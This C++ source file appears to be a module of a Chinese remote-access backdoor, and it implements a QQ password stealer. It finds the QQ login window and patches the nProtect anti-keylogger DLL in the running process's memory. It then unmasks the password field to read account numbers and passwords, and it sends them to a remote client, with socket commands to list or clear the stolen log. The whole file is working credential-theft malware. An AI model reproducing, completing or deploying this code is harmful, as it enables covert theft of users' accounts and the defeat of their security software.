#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <list>
#include <tlhelp32.h>
#include <shlwapi.h>
#pragma comment (lib,"Advapi32.lib")
#pragma comment (lib,"shlwapi.lib")

using namespace std;

#pragma pack(push, 1)
struct _HNP
{
	bool flag;
	DWORD pid;
};

struct QQInfo
{
	char szNum[32];
	char szPsw[32];
};

#pragma pack(pop)

class tagQQLOG
{
private:
	list<QQInfo> m_qqlist;
public:

	void add(char *szNum, char *szPsw);
	bool IsQQInList(char *szNum, char *szPsw);
	int ListLog(SOCKET s);
	void clean();
	int size();
};


inline void tagQQLOG::add(char *szNum, char *szPsw)
{
	QQInfo qq;
	strcpy(qq.szNum, szNum);
	strcpy(qq.szPsw, szPsw);
	m_qqlist.push_back(qq);
}

inline void tagQQLOG::clean()
{
	m_qqlist.clear();
}

inline int tagQQLOG::size()
{
	return m_qqlist.size();
}

inline bool tagQQLOG::IsQQInList(char *szNum, char *szPsw)
{
	int i = 0;
	for(list<QQInfo>::iterator it = m_qqlist.begin(); it != m_qqlist.end(); it++)
	{
		if(!strcmp(szNum, it->szNum) && !strcmp(szPsw, it->szPsw))
			return true;
	}
	return false;
}

inline int tagQQLOG::ListLog(SOCKET s)
{
	if(m_qqlist.size() <= 0)
	{
		SendMessage(s, "û�м�¼~~~~\r\n");
		return 0;
	}
	for(list<QQInfo>::iterator it = m_qqlist.begin(); it != m_qqlist.end(); it++)
	{
		SendMessage(s, "=======================\r\n"
		"QQ: %s\r\nMM: %s\r\n", it->szNum, it->szPsw);
	}
	SendMessage(s, "\r\n�ܹ� %d ����¼.\r\n", m_qqlist.size());
	return m_qqlist.size();
}
//////////////////////////////////////

class tagQQPIDLOG
{
private:
	list<_HNP> m_pidlist;
public:

	void add(DWORD pid, bool flag);
	bool IsPidInList(DWORD pid);
	bool IsPidHacked(DWORD pid);
};


inline void tagQQPIDLOG::add(DWORD pid, bool flag)
{
	_HNP hnp;
	hnp.flag = flag;
	hnp.pid = pid;
	m_pidlist.push_back(hnp);
}

inline bool tagQQPIDLOG::IsPidInList(DWORD pid)
{
	int i = 0;
	for(list<_HNP>::iterator it = m_pidlist.begin(); it != m_pidlist.end(); it++)
	{
		if(it->pid == pid)
			return true;
	}
	return false;
}

inline bool tagQQPIDLOG::IsPidHacked(DWORD pid)
{
	int i = 0;
	for(list<_HNP>::iterator it = m_pidlist.begin(); it != m_pidlist.end(); it++)
	{
		if(it->pid == pid)
			return it->flag;
	}
	return false;
}
//---------------------------------------------------------------------
//Global Variable

const char *pchWinClass = "#32770";
const long lNumWindowStyle = 0x50002380;
const long lPassCtrlWindowStyle = 0x50000044;
const long lPassEditWindowStyle = 0x500100A0;

tagQQPIDLOG pidlog;
tagQQLOG qqlog;

//---------------------------------------------------------------------
//GetStyleWindow(...) code by sdjf
HWND GetStyleWindow(HWND hFatherWindow, const long lstyle)
{
	//���������ڷ��ϲ������������ش˾��
	if (GetWindowLong(hFatherWindow, GWL_STYLE) == lstyle)
	{
		return hFatherWindow;
	}

	HWND hNextWindow, hDestWindow;

	//�õ��Ӵ��ھ��
	if ((hNextWindow = GetWindow(hFatherWindow, GW_CHILD))!= NULL)
	{
		//�ݹ�����Ӵ���
		if ((hDestWindow = GetStyleWindow(hNextWindow, lstyle)) != NULL)
		{
			return hDestWindow;
		}
	}

	//�ݹ�����ֵܴ���
	if ((hNextWindow = GetWindow(hFatherWindow, GW_HWNDNEXT)) != NULL)
	{
		return GetStyleWindow(hNextWindow, lstyle);
	}

	//û��ƥ����򷵻�NULL
	return NULL;
}

DWORD GetOffset(char *FilePath, LPVOID lpData, DWORD nSize)
{
	DWORD ret = -1;
	//���ļ�
	FILE *fp = fopen(FilePath, "rb");
	if(fp == NULL)
		return -1;
	//����һ���Ҫ�ҵ�����һ�������ڴ棬Ҳ�����еľ�̬�ռ�
	BYTE *buf = new BYTE [nSize];
	BYTE *p = buf;
	memset(buf, 0, nSize);

	//�ȶ���һ���һ��
	if(fread(buf, nSize, 1, fp) && memcmp(buf, lpData, nSize) == 0)
	{
		delete [] buf;
		fclose(fp);
		return 0;
	}

	//����ѭ��
	int count = 0;
	while(1)
	{
		if(feof(fp))
		{
			ret = -1;
			break;
		}
		//��ȡ1�ֽڵ���ǰ�ж�ͷ
		p = buf + count%nSize;
		if(!fread(p, 1, 1, fp))
			break;
		//�ж�ͷ�ƽ�1λ�����ն�ȡ�����ݳ����ж�β��
		count++;
		//�Ӷ���ͷ�����lpData�����ݱȽ�
		int i;
		for(i=0; i<nSize; i++)
		{
			if(buf[(count+i)%nSize] != (*((BYTE*)lpData+i)))
				break;
		}
		//ȫ��ƥ�䣬����ƫ��
		if(i == nSize)
		{
			ret = count;
			break;
		}
		
	}
	delete [] buf;
	fclose(fp);
	return ret;
}

BOOL EditProcessMemory(DWORD dwPid, LPVOID lpAddress, LPVOID lpBuffer, DWORD nSize, LPVOID Origin)
{
	BYTE *tmpbuf;
	DWORD NumberOfBytesRead;

	HANDLE hProcess = ZXSAPI::OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if (!hProcess)
		return FALSE;

	__try
	{
		//ָ�벻Ϊ�գ��ȱȽ�һ��Ŀ�������Ƿ�ƥ���پ����޸�
		if(Origin != NULL)
		{
			tmpbuf = new BYTE [nSize];

			if(tmpbuf == NULL)
				return FALSE;

			if(!ZXSAPI::ReadProcessMemory(hProcess, 
				lpAddress, 
				tmpbuf, 
				nSize, 
				&NumberOfBytesRead))
				return FALSE;

			if(NumberOfBytesRead != nSize || memcmp(tmpbuf, Origin, nSize) != 0)
				return FALSE;

			delete [] tmpbuf;
		}
		//д������
		if(!ZXSAPI::WriteProcessMemory(hProcess, lpAddress, lpBuffer, nSize, &NumberOfBytesRead))
		{
			DWORD err = GetLastError();
			return FALSE;
		}

		return TRUE;

	}__finally
	{
		CloseHandle(hProcess);
	}
	return 0;//~~~
}

//npkcntc.dll

BOOL Hack_nProtect(DWORD qqPID, HWND hPassWindow)
{
	BOOL Ret = FALSE;
	HANDLE hModsSnap = ZXSAPI::CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, qqPID);
	if(INVALID_HANDLE_VALUE == hModsSnap)
		return FALSE;


	MODULEENTRY32 meModuleEntry;
	meModuleEntry.dwSize = sizeof(MODULEENTRY32);

	if(!Module32First(hModsSnap, &meModuleEntry))
	{
		CloseHandle(hModsSnap);
		return FALSE;
	}

	do
	{
		if(!stricmp(meModuleEntry.szModule, "npkcntc.dll"))
		{
			//Ҫ�޸ĵĹؼ���
			DWORD origindata = 0x2201e8;
			//��Ϊ���
			DWORD todata = 0x2201e7;
			//���ļ��в���origindata�ؼ��ֵ�ƫ����
			DWORD hackOffset = GetOffset(meModuleEntry.szExePath, &origindata, sizeof(DWORD));
			//�õ���Ӧ���ڴ��е�ƫ����
			DWORD destAddr = DWORD(meModuleEntry.modBaseAddr + hackOffset);

			if(hackOffset == (DWORD)-1)
			{
#if defined _DEBUG
				printf("error: npkcntc.dll version may not matched\r\n");
#endif
				Ret = FALSE;
				break;
			}else
			{
#if defined _DEBUG
				printf("success: npkcntc.dll offset: %.8X\r\n", hackOffset);
#endif
			}
			//�޸��ڴ�����
			SendMessage(hPassWindow, WM_KILLFOCUS, 0, 0);//��qq�Լ����˳����̱���
			Ret = EditProcessMemory(qqPID, (LPVOID)destAddr, &todata, sizeof(DWORD), &origindata);
			SendMessage(hPassWindow, WM_SETFOCUS, 0, 0);

			if(Ret)
			{
#if defined _DEBUG
				printf("success: Hack_nProtect\r\n");
#endif
			}else
			{
#if defined _DEBUG
				printf("error: Hack_nProtect\r\n");
#endif
			}
			break;
		}

	} while(Module32Next(hModsSnap, &meModuleEntry));

	CloseHandle(hModsSnap);
	return Ret;
}

void GetQQPassword()
{
	long ret;
	char asterisk;
	HWND hLoginWindow, hNumWindow, hPassCtrl, hPassWindow;
	char szNum[32], szPass[32];
	DWORD ThreadID,ProcessID;
	char szText[50];
	memset(szText, 0, sizeof(szText));

	HKEY hkey;
	if(ZXSAPI::RegOpenKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\TENCENT", &hkey) != ERROR_SUCCESS)
		return;
	RegCloseKey(hkey);

	ChangeServiceDesktop(NULL);

	while(1)
	{
		Sleep(20);
		hLoginWindow = GetForegroundWindow();
		if(!GetClassName(hLoginWindow, szText, sizeof(szText)-1))
			continue;
		if(stricmp(szText, pchWinClass) != 0)
			continue;
		GetWindowText(hLoginWindow, szText, sizeof(szText)-1);
		if(!strstr(szText, "QQ"))
			continue;

		hNumWindow = GetStyleWindow(hLoginWindow, lNumWindowStyle);
		hPassCtrl = GetStyleWindow(hLoginWindow, lPassCtrlWindowStyle);
		hPassWindow = GetStyleWindow(hPassCtrl, lPassEditWindowStyle);
		asterisk = (char)SendMessage(hPassWindow, EM_GETPASSWORDCHAR, 0, 0);

		ThreadID = GetWindowThreadProcessId(hLoginWindow, &ProcessID);
		if(hPassWindow && !pidlog.IsPidInList(ProcessID))
		{
			pidlog.add(ProcessID, Hack_nProtect(ProcessID, hPassWindow));//�޸��ڴ�ָ���ñ����´���������
		}
		if(pidlog.IsPidHacked(ProcessID))
		{
			if((hLoginWindow == GetForegroundWindow()) && hNumWindow && hPassWindow)
			{
#if defined _DEBUG
				printf("QQ Login Window activated, hNum: %.8X, hPass: %.8X\r\n", hNumWindow, hPassWindow);
#endif
				memset(szNum, 0, sizeof(szNum));
				memset(szPass, 0, sizeof(szPass));
				while(hLoginWindow == GetForegroundWindow())
				{
					SendMessage(hNumWindow, WM_GETTEXT, sizeof(szNum), (LPARAM)szNum);
					PostMessage(hPassWindow, EM_SETPASSWORDCHAR, 0, 0);
					SendMessage(hPassWindow, WM_GETTEXT, sizeof(szPass), (LPARAM)szPass);
					PostMessage(hPassWindow, EM_SETPASSWORDCHAR, asterisk, 0);

					Sleep(160);
				}
				if(szNum[0] && szPass[0] && !qqlog.IsQQInList(szNum, szPass))
				{
					char szRecord[MAX_PATH];
					qqlog.add(szNum, szPass);
					int len = sprintf(szRecord, 
						"\r\n=======�ܹ� %d ����¼, �������¼�¼\r\n"
						"QQ��: %s\r\n����: %s\r\n", qqlog.size(), szNum, szPass);
#if defined _DEBUG
					printf("\r\n==================\r\n"
						"QQ��: %s\r\n����: %s\r\n", szNum, szPass);

#endif
					ShellOnline.SendMsgToClient(szRecord, len);
				}
			}
		}
	}

}

void StartQQLogger()
{
	DWORD dwThreadId;
	HANDLE hThread;

	hThread = ZXSAPI::CreateThread(0, 0, (LPTHREAD_START_ROUTINE)GetQQPassword, (LPVOID)0, 0, &dwThreadId);
	CloseHandle(hThread);
}

int GetQQPswLog(MainPara *args)
{
	SOCKET Socket = args->Socket;

	ARGWTOARGVA arg(args->lpCmd);
	int argc = arg.GetArgc();
	char **argv = arg.GetArgv();

	char *Usage = ""
		"Usage:\r\n"
		"QQLog [-List] [-Cleanup]\r\n"
		"Options:\r\n"
		"    -list    �г����м�¼\r\n"
		"    -cleanup ��ռ�¼\r\n";
	if(argc < 2)
		return SendMessage(Socket, Usage);
	//��ȡ���� start
	for(int i=1; i<argc; i++)
	{
		if(argv[i][0] == '-' || argv[i][0] == '/')
		{
			if(!stricmp(&argv[i][1], "List"))
			{
				qqlog.ListLog(Socket);
				return 0;
			}else if(!stricmp(&argv[i][1], "Cleanup"))
			{
				qqlog.clean();
				SendMessage(Socket, "��¼�����.\r\n");
				return 0;
			}
		}
	}//end
	SendMessage(Socket, Usage);
	return 0;   // The Program Quit
}